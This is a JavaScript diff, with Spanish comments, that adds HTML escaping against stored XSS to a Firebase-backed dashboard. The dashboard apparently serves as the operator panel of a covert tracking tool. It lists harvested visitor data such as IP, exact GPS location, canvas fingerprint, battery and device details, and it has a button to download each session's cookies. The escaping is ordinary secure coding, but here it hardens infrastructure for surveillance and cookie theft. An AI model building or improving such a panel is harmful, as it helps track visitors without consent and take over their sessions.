@@ -7,6 +7,17 @@ if (typeof firebase !== 'undefined' && !firebase.apps.length) {
 }
 const db = firebase.database();
 
+// Función sanitizadora contra Stored XSS
+function escapeHTML(str) {
+  if (str === null || str === undefined) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
 // Variables globales de UI
 let rawData = {};
 let map = null;
@@ -146,27 +157,27 @@ function renderDeviceCardsGrid(items) {
   let html = '';
   items.forEach(item => {
     const geo = item.geo || {};
-    const fp = item.canvasFingerprint || 'N/A';
-    const jsonStr = JSON.stringify(item, null, 2);
+    const fp = escapeHTML(item.canvasFingerprint || 'N/A');
+    const jsonStr = escapeHTML(JSON.stringify(item, null, 2));
 
     html += `
       <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 16px; display: flex; flex-direction: column; gap: 10px;">
         <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border-color); padding-bottom:8px;">
-          <span style="font-weight:700; color:#00ff88; font-size:0.85rem;">💻 ${item.platform || 'Desconocido'}</span>
+          <span style="font-weight:700; color:#00ff88; font-size:0.85rem;">💻 ${escapeHTML(item.platform || 'Desconocido')}</span>
           <span class="tag ${item.geo?.gps?.lat ? 'tag-gps' : 'tag-ip'}" style="font-size:0.7rem;">${fp}</span>
         </div>
         <div style="font-size:0.8rem; color:var(--text-main); font-family:var(--font-code);">
-          🌐 <strong>IP:</strong> ${item.ip || 'N/A'}<br/>
-          📍 <strong>Ubicación:</strong> ${geo.city || 'N/A'}, ${geo.country || 'N/A'}<br/>
-          🎮 <strong>GPU:</strong> ${item.webglRenderer ? item.webglRenderer.split('(')[0] : 'N/A'}<br/>
-          🔋 <strong>Batería:</strong> ${item.battery ? item.battery.level : 'N/A'} | 🛑 <strong>AdBlock:</strong> ${item.adBlockDetected || 'No'}<br/>
-          📷 <strong>Periféricos:</strong> ${item.mediaDevicesCount || 'N/A'} dispositivos
+          🌐 <strong>IP:</strong> ${escapeHTML(item.ip || 'N/A')}<br/>
+          📍 <strong>Ubicación:</strong> ${escapeHTML(geo.city || 'N/A')}, ${escapeHTML(geo.country || 'N/A')}<br/>
+          🎮 <strong>GPU:</strong> ${escapeHTML(item.webglRenderer ? item.webglRenderer.split('(')[0] : 'N/A')}<br/>
+          🔋 <strong>Batería:</strong> ${escapeHTML(item.battery ? item.battery.level : 'N/A')} | 🛑 <strong>AdBlock:</strong> ${escapeHTML(item.adBlockDetected || 'No')}<br/>
+          📷 <strong>Periféricos:</strong> ${escapeHTML(item.mediaDevicesCount || 'N/A')} dispositivos
         </div>
         <details style="margin-top:6px; background:var(--bg-dark); border:1px solid var(--border-color); border-radius:4px; padding:8px;">
           <summary style="font-size:0.75rem; color:#00a8ff; cursor:pointer; font-weight:700;">📄 Ver Objeto JSON Completo</summary>
           <pre style="font-size:0.7rem; color:#00ff88; margin-top:8px; max-height:180px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;">${jsonStr}</pre>
         </details>
-          <button class="btn-action" style="margin-top:6px; align-self:flex-start;" onclick="downloadCookies('${item.sessionId}')">🍪 Descargar Cookies</button>
+          <button class="btn-action" style="margin-top:6px; align-self:flex-start;" onclick="downloadCookies('${escapeHTML(item.sessionId)}')">🍪 Descargar Cookies</button>
       </div>
     `;
   });
@@ -271,17 +282,17 @@ function renderTable(items) {
 
   let html = '';
   filtered.forEach(item => {
-    const dateStr = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A';
+    const dateStr = item.timestamp ? escapeHTML(new Date(item.timestamp).toLocaleString()) : 'N/A';
     const geo = item.geo || {};
-    const locStr = [geo.city, geo.country].filter(Boolean).join(', ') || 'Desconocida';
+    const locStr = escapeHTML([geo.city, geo.country].filter(Boolean).join(', ') || 'Desconocida');
     const isGPS = geo.gps && geo.gps.lat;
     
     html += `
-      <tr data-id="${item.sessionId}">
+      <tr data-id="${escapeHTML(item.sessionId)}">
         <td>${dateStr}</td>
-        <td style="color:#00a8ff; font-weight:700;">${item.ip || 'N/A'}</td>
+        <td style="color:#00a8ff; font-weight:700;">${escapeHTML(item.ip || 'N/A')}</td>
         <td>📍 ${locStr}</td>
-        <td>${item.platform || 'N/A'}</td>
+        <td>${escapeHTML(item.platform || 'N/A')}</td>
         <td>
           <span class="tag ${isGPS ? 'tag-gps' : 'tag-ip'}">
             ${isGPS ? '🎯 GPS EXACTO' : '🌐 IP GEO'}
